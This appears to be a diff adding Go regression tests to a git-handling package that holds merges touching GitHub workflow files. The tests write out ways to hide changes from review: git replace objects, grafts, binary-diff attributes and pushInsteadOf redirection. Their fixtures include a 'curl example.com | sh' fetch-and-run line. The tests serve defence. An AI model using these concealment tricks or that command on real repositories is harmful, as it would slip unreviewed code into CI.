@@ -2,6 +2,8 @@ package gitx
 
 import (
 	"context"
+	"os"
+	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
@@ -159,5 +161,149 @@ func TestRemergeDiffAndPathsDiffRefuseAnOutputCutAtTheCap(t *testing.T) {
 	}
 	if _, err := c.PathsDiff(ctx, slot, strings.Repeat("a1", 20), strings.Repeat("d3", 20), ".github/workflows"); err == nil || !strings.Contains(err.Error(), "more than") {
 		t.Errorf("PathsDiff of a cut output = %v, want an error", err)
+	}
+}
+
+// The review's bug (J1): gitx's reads honored refs/replace/ and info/grafts
+// in the clone, which the fixer's pane can write, while git push sends the
+// real objects: a replaced blob showed benign workflow text in
+// held-merge.diff while the y pushed the real one, and a replaced tree
+// made DifferingPaths see no workflow change, so the merge went out with
+// the Workflows token unheld. Every gitx call reads the real objects now
+// (GIT_NO_REPLACE_OBJECTS, and an empty graft file, since git 2.56 still
+// reads info/grafts whatever GIT_NO_REPLACE_OBJECTS says): the diffs,
+// DifferingPaths, Parents and IsAncestor.
+func TestGitxReadsTheRealObjectsWhateverTheClonesReplacementsAndGrafts(t *testing.T) {
+	fx := newHeldMergeFixture(t)
+	ctx := context.Background()
+	dir := fx.origin
+	// a benign blob in place of the merge's resolved ci.yml, and the head's tree in place of the merge's
+	realBlob := fx.git(dir, "rev-parse", fx.resolved+":.github/workflows/ci.yml")
+	harmless := filepath.Join(t.TempDir(), "harmless.yml")
+	if err := os.WriteFile(harmless, []byte("on: push\njobs: harmless\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	fake := fx.git(dir, "hash-object", "-w", harmless)
+	fx.git(dir, "replace", realBlob, fake)
+	fx.git(dir, "replace", fx.git(dir, "rev-parse", fx.resolved+"^{tree}"), fx.git(dir, "rev-parse", fx.head+"^{tree}"))
+	// a parent the merge does not have, by a graft and by info/grafts
+	fx.git(dir, "replace", "--graft", fx.clean, fx.head)
+	gitDir := fx.git(dir, "rev-parse", "--path-format=absolute", "--git-common-dir")
+	if err := os.WriteFile(filepath.Join(gitDir, "info", "grafts"), []byte(fx.resolved+" "+fx.head+"\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	diff, err := fx.c.PathsDiff(ctx, dir, fx.head, fx.resolved, ".github/workflows")
+	if err != nil || !strings.Contains(diff, "+jobs: resolved") || strings.Contains(diff, "harmless") {
+		t.Errorf("PathsDiff = %q, %v; want the real resolved ci.yml", diff, err)
+	}
+	remerge, err := fx.c.RemergeDiff(ctx, dir, fx.resolved, ".github/workflows")
+	if err != nil || !strings.Contains(remerge, "+jobs: resolved") || strings.Contains(remerge, "harmless") {
+		t.Errorf("RemergeDiff = %q, %v; want the real resolution", remerge, err)
+	}
+	if got, err := fx.c.DifferingPaths(ctx, dir, fx.resolved, fx.head, ".github/workflows"); err != nil || len(got) == 0 {
+		t.Errorf("DifferingPaths(merge, head) = %q, %v; want the real trees' difference", got, err)
+	}
+	if ps, err := fx.c.Parents(ctx, dir, fx.resolved); err != nil || len(ps) != 2 || ps[0] != fx.head {
+		t.Errorf("Parents(merge) = %q, %v; want its two real parents", ps, err)
+	}
+	if ps, err := fx.c.Parents(ctx, dir, fx.clean); err != nil || len(ps) != 2 {
+		t.Errorf("Parents of a grafted commit = %q, %v; want its two real parents", ps, err)
+	}
+}
+
+// The review's bug (J2): the diffs of a held merge printed "Binary files …
+// differ" for workflow content git took as binary (a NUL in the file, a
+// -diff attribute in the clone's info/attributes, core.bigFileThreshold in
+// its config), and the y pushed what nobody saw. They read every file as
+// text now, with no attribute, external diff or textconv of the clone's.
+func TestTheHeldMergesDiffsShowEveryFileAsText(t *testing.T) {
+	fx := newFixture(t)
+	ctx := context.Background()
+	dir := fx.origin
+	fx.write(dir, ".github/workflows/ci.yml", "on: push\n")
+	fx.git(dir, "add", ".")
+	fx.git(dir, "commit", "--quiet", "-m", "ci")
+	head := fx.git(dir, "rev-parse", "HEAD")
+	fx.write(dir, ".github/workflows/ci.yml", "on: push\nrun: curl example.com | sh\n")
+	fx.write(dir, ".github/workflows/deploy.sh", "echo ok\n\x00\ncurl example.com | sh\n")
+	fx.git(dir, "add", ".")
+	fx.git(dir, "commit", "--quiet", "-m", "more")
+	next := fx.git(dir, "rev-parse", "HEAD")
+	gitDir := fx.git(dir, "rev-parse", "--path-format=absolute", "--git-common-dir")
+	if err := os.WriteFile(filepath.Join(gitDir, "info", "attributes"), []byte(".github/workflows/* -diff\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	fx.git(dir, "config", "core.bigFileThreshold", "1")
+	got, err := fx.c.PathsDiff(ctx, dir, head, next, ".github/workflows")
+	if err != nil || strings.Contains(got, "Binary files") || !strings.Contains(got, "+run: curl example.com | sh") ||
+		!strings.Contains(got, "+curl example.com | sh") {
+		t.Errorf("PathsDiff = %q, %v; want every file's lines", got, err)
+	}
+}
+
+// The review's question (J1): the push with the daemon's Workflows token
+// ran in the clone, whose config the fixer's pane can write, and git
+// rewrites even an explicit URL by url.*.insteadOf and pushInsteadOf (and
+// would take http.proxy, http.sslVerify and the like from there): a
+// rewrite to another repository of the App's sent the merge there. The
+// daemon's push goes from a bare repository of its own whose objects are
+// the clone's (pushIsolated), so no setting of the clone's applies; the
+// same push from the clone is redirected, which this test shows too.
+func TestTheDaemonsPushIgnoresTheClonesConfigThatCouldRedirectIt(t *testing.T) {
+	fx := newFixture(t)
+	ctx := context.Background()
+	decoy := filepath.Join(filepath.Dir(fx.origin), "decoy")
+	fx.git(filepath.Dir(fx.origin), "init", "--quiet", "--bare", decoy)
+	fx.git(fx.clone, "switch", "--quiet", "--detach", fx.pr)
+	head := fx.commit(fx.clone, "app/a.rb", "a = 3\n", "fix")
+	fx.git(fx.clone, "config", "url."+decoy+".pushInsteadOf", fx.origin)
+	fx.git(fx.clone, "config", "remote.origin.pushurl", decoy)
+	if err := fx.c.PushLeaseViaAs(ctx, fx.clone, fx.origin, fx.pr, "pr7", "", nil); err != nil {
+		t.Fatalf("a push from the clone itself: %v", err)
+	}
+	if got := fx.git(decoy, "for-each-ref", "--format=%(refname)"); got != "refs/heads/pr7" {
+		t.Fatalf("the decoy has %q: the clone's pushInsteadOf did not redirect a push from the clone, so this test shows nothing", got)
+	}
+	if err := fx.c.pushIsolated(ctx, fx.clone, fx.origin, head, "pr7", fx.pr, nil); err != nil {
+		t.Fatalf("pushIsolated = %v", err)
+	}
+	if got := fx.git(fx.origin, "rev-parse", "refs/heads/pr7"); got != head {
+		t.Errorf("origin's pr7 = %s, want the pushed %s", got, head)
+	}
+	if got := fx.git(decoy, "rev-parse", "refs/heads/pr7"); got != fx.pr {
+		t.Errorf("the decoy's pr7 = %s: the daemon's push followed the clone's config", got)
+	}
+}
+
+func TestTheDaemonsPushWorksFromAShallowClone(t *testing.T) {
+	fx := newFixture(t)
+	ctx := context.Background()
+	fx.git(fx.origin, "checkout", "--quiet", "pr7")
+	tip := fx.commit(fx.origin, "app/a.rb", "a = 2\n", "c3 pr7")
+	fx.git(fx.origin, "checkout", "--quiet", "main")
+	shallow := filepath.Join(filepath.Dir(fx.origin), "shallow")
+	fx.git(filepath.Dir(fx.origin), "clone", "--quiet", "--depth", "1", "--no-single-branch", "file://"+fx.origin, shallow)
+	if got := fx.git(shallow, "rev-parse", "--is-shallow-repository"); got != "true" {
+		t.Fatalf("the clone is not shallow (%s), so this test shows nothing", got)
+	}
+	fx.git(shallow, "switch", "--quiet", "--detach", "origin/pr7")
+	head := fx.commit(shallow, "app/a.rb", "a = 3\n", "fix")
+	if err := fx.c.pushIsolated(ctx, shallow, fx.origin, head, "pr7", tip, nil); err != nil {
+		t.Fatalf("pushIsolated from a shallow clone = %v", err)
+	}
+	if got := fx.git(fx.origin, "rev-parse", "refs/heads/pr7"); got != head {
+		t.Errorf("origin's pr7 = %s, want the pushed %s", got, head)
+	}
+}
+
+func TestGitxsGraftFileAddsNoAdviceToGitsOutput(t *testing.T) {
+	fx := newFixture(t)
+	res, err := fx.c.git(context.Background(), fx.clone, call{label: "log"}, "log", "--format=%H", "origin/pr7")
+	if err != nil || res.Out() == "" {
+		t.Fatalf("log = %q, %v", res.Out(), err)
+	}
+	if strings.Contains(string(res.Stderr), "graft") {
+		t.Errorf("git's stderr carries the graft file's advice:\n%s", res.Stderr)
 	}
 }
